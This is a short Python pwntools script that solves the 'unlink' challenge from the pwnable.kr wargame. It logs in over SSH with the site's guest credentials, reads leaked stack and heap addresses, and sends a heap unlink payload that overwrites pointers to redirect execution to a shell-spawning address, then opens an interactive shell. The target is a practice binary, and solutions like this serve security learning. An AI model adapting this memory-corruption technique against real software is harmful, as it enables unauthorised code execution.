#!/usr/bin/python

#unlink from pwnable.kr

from pwn import * 

def main():
    s = ssh(host="pwnable.kr", user="unlink", password="guest", port=2222)
    sh = s.process(["./unlink"])
    stack = sh.recvline().split()[-1]
    heap = sh.recvline().split()[-1]
    sh.recvline()
    padding = 'A'*12
    target = int(stack, 16) + 0x10
    inject = int(heap, 16) + 0x0c
    shell_addr = p32(0x80484eb)
    payload = shell_addr + padding + p32(inject) + p32(target)
    sh.send(payload)
    sh.interactive()

if __name__=="__main__":
    main()
